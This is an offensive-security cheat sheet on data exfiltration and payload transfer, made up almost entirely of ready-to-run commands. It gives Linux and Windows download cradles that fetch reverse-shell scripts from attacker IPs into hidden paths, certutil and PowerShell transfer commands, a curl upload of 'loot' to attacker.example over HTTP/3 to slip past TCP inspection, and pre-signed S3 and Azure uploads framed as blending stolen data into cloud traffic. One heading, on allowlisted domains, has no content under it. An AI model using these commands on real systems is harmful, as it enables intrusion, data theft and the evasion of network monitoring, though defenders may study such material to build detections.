# 🔓 Exfiltration Cheat Sheet: Techniques, Tools & Living Off the Land

## Pre-Engagement: Identify Allowlisted Domains
Before attempting exfiltration, check for commonly trusted domains that can be abused for C2 or data smuggling:
## Encoding & Obfuscation

### Copy/Paste Base64
**Linux**
```bash
base64 -w0 <file>        # Encode (single line)
base64 -d file 
```

**Windows**
```bash
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

##  HTTP/HTTPS Transfers (Egress)

### Linux Download Utilities
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py # FreeBSD
```
### Windows Download Utilities

**Certutil & Bitsadmin:**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer job /priority high http://example.com/file.pdf C:\Windows\Temp\file.pdf
```

**PowerShell:**
```powershell
# WebClient
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2/tool.exe","C:\Windows\Temp\tool.exe")
# BitsTransfer
Start-BitsTransfer -Source "http://10.10.14.2/tool.exe" -Destination "C:\Windows\Temp\tool.exe"
```

### HTTP/3 & QUIC (Bypass TCP/443 Inspection)

If egress rules inspect TCP/443 but allow UDP/443, force HTTP/3:
```bash
# Strict QUIC only
curl --http3-only -T loot.7z https://attacker.example/upload
# Ops: Ensure server advertises Alt-Svc: h3
```

### Pre-Signed Object Storage Uploads

Blend into normal cloud traffic using signed URLs (no SDK required):
```bash
# AWS S3
curl -X PUT -T loot.7z "https://bucket.s3.amazonaws.com/loot.7z?<presigned>"
# Azure Blob SAS
curl -X PUT --data-binary @loot.7z -H "x-ms-blob-type: BlockBlob" "https://acct.blob.core.windows.net/container/loot.7z?<sas>"
```

